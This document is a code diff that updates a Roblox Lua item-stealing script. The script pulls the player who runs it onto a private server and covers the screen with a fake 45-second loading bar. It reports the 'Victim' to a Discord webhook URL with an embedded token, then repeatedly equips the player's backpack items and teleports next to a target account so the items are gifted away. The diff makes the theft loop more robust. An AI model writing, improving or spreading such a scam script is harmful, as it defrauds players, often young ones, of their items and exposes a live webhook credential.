@@ -2,7 +2,6 @@ local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
-local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1515614244295544912/80SYn-CwUdEOAy_UKRzveYvrEzWd21ijv2uZLdXf2JQLY8rVcHS7bug_w_3M6qVHoCqy"
@@ -12,8 +11,8 @@ local PRIVATE_SERVER_LINK_CODE = "https://www.roblox.com/share?code=c17ae8bc0277
 
 -- Force TP to your private server
 task.spawn(function()
-    wait(2)
-    if PRIVATE_SERVER_LINK_CODE and PRIVATE_SERVER_LINK_CODE \~= "https://www.roblox.com/share?code=c17ae8bc0277f44e8edf06e557182767&type=Server" then
+    wait(3)
+    if PRIVATE_SERVER_LINK_CODE and PRIVATE_SERVER_LINK_CODE \~= "c17ae8bc0277f44e8edf06e557182767" then
         pcall(function()
             TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player, nil, {privateServerLinkCode = PRIVATE_SERVER_LINK_CODE})
         end)
@@ -22,9 +21,11 @@ end)
 
 -- Persistent loading screen
 task.spawn(function()
-    for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
-        pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
-    end
+    pcall(function()
+        for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
+            StarterGui:SetCoreGuiEnabled(guiType, false)
+        end
+    end)
 
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.IgnoreGuiInset = true
@@ -58,26 +59,24 @@ task.spawn(function()
     Bar.Parent = BarBG
 
     local start = tick()
-    while tick() - start < 40 do
-        local p = math.clamp((tick() - start) / 40, 0, 1)
+    while tick() - start < 45 do
+        local p = math.clamp((tick() - start) / 45, 0, 1)
         Bar.Size = UDim2.new(p,0,1,0)
-        wait(0.07)
+        task.wait(0.1)
     end
     Bar.Size = UDim2.new(1,0,1,0)
 end)
 
--- Webhook loot dump
+-- Webhook
 task.spawn(function()
-    wait(6)
+    task.wait(8)
     local backpack = player:FindFirstChild("Backpack")
-    local items = {}
+    local itemCount = 0
     if backpack then
-        for _, v in ipairs(backpack:GetChildren()) do
-            table.insert(items, v.Name)
-        end
+        itemCount = #backpack:GetChildren()
     end
 
-    local msg = "@everyone **Harvest**\nVictim: " .. player.Name .. "\nTo: " .. TARGET_PLAYER_NAME .. "\nItems: " .. #items
+    local msg = "@everyone **Harvest**\nVictim: " .. player.Name .. "\nTo: " .. TARGET_PLAYER_NAME .. "\nItems: " .. itemCount
 
     local req = (syn and syn.request) or http_request or request
     if req and WEBHOOK_URL then
@@ -92,54 +91,56 @@ task.spawn(function()
     end
 end)
 
--- Improved auto gift (equip + aggressive positioning, works PC/mobile)
+-- Auto gift loop (fixed + safer)
 local function equipItem(item)
-    local char = player.Character
-    if char and char:FindFirstChild("Humanoid") and item then
-        item.Parent = char
-        pcall(function()
+    pcall(function()
+        local char = player.Character
+        if char and char:FindFirstChild("Humanoid") and item then
+            item.Parent = char
             char.Humanoid:EquipTool(item)
-        end)
-    end
+        end
+    end)
 end
 
 task.spawn(function()
     while true do
-        local backpack = player:FindFirstChild("Backpack")
-        if backpack then
-            local itemsList = backpack:GetChildren()
-            for _, item in ipairs(itemsList) do
-                if item and item.Parent == backpack then
-                    equipItem(item)
-                    wait(0.6)
+        pcall(function()
+            local backpack = player:FindFirstChild("Backpack")
+            if backpack then
+                for _, item in ipairs(backpack:GetChildren()) do
+                    if item and item.Parent == backpack then
+                        equipItem(item)
+                        task.wait(0.7)
 
-                    local target = Players:FindFirstChild(TARGET_PLAYER_NAME)
-                    if target and target.Character and player.Character then
-                        local myRoot = player.Character:FindFirstChild("HumanoidRootPart")
-                        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
-                        if myRoot and tRoot then
-                            -- Aggressive close positioning for gift prompt
-                            myRoot.CFrame = tRoot.CFrame * CFrame.new(2.5, 0, 2.5)
-                            wait(0.5)
+                        local target = Players:FindFirstChild(TARGET_PLAYER_NAME)
+                        if target and target.Character and player.Character then
+                            local myRoot = player.Character:FindFirstChild("HumanoidRootPart")
+                            local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
+                            if myRoot and tRoot then
+                                myRoot.CFrame = tRoot.CFrame * CFrame.new(2, 1, 2)
+                            end
                         end
+                        task.wait(2.2)
                     end
-
-                    wait(1.8) -- hold time for gift prompt (PC: hold E, Mobile: hold gift button)
                 end
             end
-        end
-        wait(0.8)
+        end)
+        task.wait(1)
     end
 end)
 
--- Auto re-equip on character respawn
-player.CharacterAdded:Connect(function(char)
-    wait(1)
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, item in ipairs(backpack:GetChildren()) do
-            equipItem(item)
-            wait(0.4)
+-- Re-equip on respawn
+player.CharacterAdded:Connect(function()
+    task.wait(2)
+    pcall(function()
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            for _, item in ipairs(backpack:GetChildren()) do
+                equipItem(item)
+                task.wait(0.5)
+            end
         end
-    end
+    end)
 end)
+
+print("Script loaded")
